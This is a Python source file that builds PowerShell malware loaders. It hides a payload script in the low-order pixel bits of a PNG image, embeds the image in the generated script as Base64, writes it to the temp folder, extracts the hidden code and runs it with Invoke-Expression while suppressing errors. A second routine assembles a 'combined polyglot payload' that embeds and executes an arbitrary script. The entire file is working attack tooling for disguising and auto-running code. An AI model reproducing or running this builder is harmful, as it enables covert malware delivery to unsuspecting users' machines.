"""
Phase 2: Build Extractor - Create PowerShell script that extracts hidden data from image
Input: metadata.json (from Phase 1) + image with hidden data
Output: extractor.ps1 (can be embedded in polyglot)
"""

import json
import argparse
import base64
from pathlib import Path


class ExtractorBuilder:
    def __init__(self, verbose=True):
        self.verbose = verbose
    
    def log(self, message):
        if self.verbose:
            print(f"[BUILDER] {message}")
    
    def build(self, metadata_path, output_path, image_b64=None):
        """
        Create PowerShell extractor script
        
        Args:
            metadata_path: Path to metadata.json from steganography
            output_path: Path to save PowerShell script
            image_b64: Optional Base64 image data to embed in script
        
        Returns:
            str: PowerShell script content
        """
        self.log(f"Reading metadata from: {metadata_path}")
        with open(metadata_path, 'r') as f:
            metadata = json.load(f)
        
        data_length = metadata['data_length']
        image_mode = metadata.get('image_mode', 'RGB')
        
        self.log(f"Data length: {data_length} bytes")
        self.log(f"Image mode: {image_mode}")
        
        # Create PowerShell extraction function
        ps_script = self._generate_ps_extractor(data_length, image_mode, image_b64)
        
        self.log(f"Saving PowerShell script to: {output_path}")
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(ps_script)
        
        self.log("Extractor script created successfully!")
        return ps_script
    
    def _generate_ps_extractor(self, data_length, image_mode, image_b64=None):
        """Generate PowerShell extraction code"""
        
        if image_b64:
            # Embed image as Base64 in script
            image_loading = f'''
$imageBase64 = "{image_b64}"
$imageBytes = [Convert]::FromBase64String($imageBase64)
$tempImagePath = Join-Path $env:TEMP ("stego_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".png")
[System.IO.File]::WriteAllBytes($tempImagePath, $imageBytes)
$imagePath = $tempImagePath
'''
        else:
            # Load from parameter
            image_loading = '''
if (-not $imagePath) {
    $imagePath = $PSScriptRoot + "\image.png"
}
'''
        
        ps_script = f'''# ===== LSB STEGANOGRAPHY EXTRACTOR =====
# Auto-generated PowerShell extraction script
# Extracts hidden data from image using LSB technique

$ErrorActionPreference = "SilentlyContinue"

function Extract-LSBData {{
    param(
        [string]$imagePath,
        [int]$dataLength
    )
    
    try {{
        # Load image
        [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
        $bitmap = [System.Drawing.Bitmap]::FromFile($imagePath)
        
        $width = $bitmap.Width
        $height = $bitmap.Height
        
        Write-Host "[*] Image size: $width x $height"
        Write-Host "[*] Extracting $dataLength bytes..."
        
        # Extract LSB bits
        $extractedBits = ""
        $pixelCount = 0
        
        for ($y = 0; $y -lt $height; $y++) {{
            for ($x = 0; $x -lt $width; $x++) {{
                $pixel = $bitmap.GetPixel($x, $y)
                
                # Extract LSB from R, G, B channels
                $r = $pixel.R -band 1
                $g = $pixel.G -band 1
                $b = $pixel.B -band 1
                
                $extractedBits += "$r$g$b"
                
                if ($extractedBits.Length -ge ($dataLength * 8)) {{
                    break
                }}
            }}
            if ($extractedBits.Length -ge ($dataLength * 8)) {{
                break
            }}
        }}
        
        # Convert binary bits to bytes
        $extractedData = [byte[]]::new($dataLength)
        for ($i = 0; $i -lt $dataLength; $i++) {{
            $byte = ""
            for ($j = 0; $j -lt 8; $j++) {{
                $bitIndex = $i * 8 + $j
                if ($bitIndex -lt $extractedBits.Length) {{
                    $byte += $extractedBits[$bitIndex]
                }}
            }}
            if ($byte.Length -eq 8) {{
                $extractedData[$i] = [Convert]::ToInt32($byte, 2)
            }}
        }}
        
        Write-Host "[+] Extraction successful! Retrieved $($extractedData.Length) bytes"
        
        $bitmap.Dispose()
        return $extractedData
    }}
    catch {{
        Write-Host "[-] Extraction failed: $_"
        return $null
    }}
}}

# ===== MAIN EXECUTION =====

{image_loading}

# Extract hidden data
$hiddenData = Extract-LSBData -imagePath $imagePath -dataLength {data_length}

if ($hiddenData) {{
    # Convert bytes to string (PowerShell script)
    $hiddenScript = [System.Text.Encoding]::UTF8.GetString($hiddenData)
    
    # Execute hidden script
    Write-Host "[*] Executing hidden payload..."
    Invoke-Expression $hiddenScript
}}
'''
        
        return ps_script
    
    def create_complete_payload(self, metadata_path, image_path, payload_script_path, output_path):
        """
        Create complete payload that:
        1. Extracts image from its own binary
        2. Loads image with hidden data
        3. Extracts hidden script
        4. Executes it
        
        Args:
            metadata_path: Path to metadata.json
            image_path: Path to image with hidden data (PNG)
            payload_script_path: Path to payload PowerShell script to hide
            output_path: Path to save complete script
        """
        self.log("Creating complete payload script...")
        
        # Read image and encode as Base64
        self.log(f"Reading image: {image_path}")
        with open(image_path, 'rb') as f:
            image_data = f.read()
        image_b64 = base64.b64encode(image_data).decode('utf-8')
        
        # Build extractor with embedded image
        self.log("Building extractor with embedded image...")
        extractor_script = self.build(metadata_path, None, image_b64)
        
        # Read hidden payload
        self.log(f"Reading hidden payload: {payload_script_path}")
        with open(payload_script_path, 'r', encoding='utf-8') as f:
            hidden_payload = f.read()
        
        # Create combined script
        combined_script = f'''# ===== COMBINED POLYGLOT PAYLOAD =====
# This script:
# 1. Contains encoded image with hidden data
# 2. Extracts and displays the image
# 3. Extracts and executes the hidden payload

$ErrorActionPreference = "SilentlyContinue"

{extractor_script}

# ===== HIDDEN PAYLOAD EXECUTION =====
Write-Host "[!] Executing hidden payload..."

{hidden_payload}

exit 0
'''
        
        self.log(f"Saving combined script to: {output_path}")
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(combined_script)
        
        self.log("Complete payload created!")
        return combined_script


def main():
    parser = argparse.ArgumentParser(description='Build PowerShell extractor for LSB steganography')
    parser.add_argument('--metadata', required=True, help='Path to metadata.json from steganography')
    parser.add_argument('--image', help='Path to image with hidden data (for complete payload)')
    parser.add_argument('--payload', help='Path to payload script to hide (for complete payload)')
    parser.add_argument('--output', required=True, help='Output path for extractor script')
    
    args = parser.parse_args()
    
    builder = ExtractorBuilder()
    
    if args.image and args.payload:
        # Create complete payload
        builder.create_complete_payload(args.metadata, args.image, args.payload, args.output)
    else:
        # Create simple extractor
        builder.build(args.metadata, args.output)


if __name__ == '__main__':
    main()
